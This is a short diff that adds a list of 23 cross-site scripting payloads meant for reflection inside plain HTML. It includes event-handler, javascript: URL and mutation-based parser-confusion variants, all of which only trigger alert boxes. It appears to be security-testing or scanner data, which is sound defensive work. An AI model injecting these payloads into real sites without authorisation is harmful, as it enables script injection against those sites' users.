@@ -1,0 +1,24 @@
+# Reflected in plain HTML body between tags.
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<body onload=alert(1)>
+<iframe src="javascript:alert(1)">
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>x</marquee>
+<video><source onerror=alert(1)>
+<input autofocus onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)></select>
+<textarea autofocus onfocus=alert(1)></textarea>
+<object data="javascript:alert(1)">
+<a href="javascript:alert(1)">x</a>
+<form><button formaction="javascript:alert(1)">x</button></form>
+<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<script>alert`1`</script>
+<script>onerror=alert;throw 1</script>
+<img src=x onerror="alert(document.domain)">
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<xss id=x tabindex=1 onfocus=alert(1) style=display:block>#x:focus{outline:none}</xss>
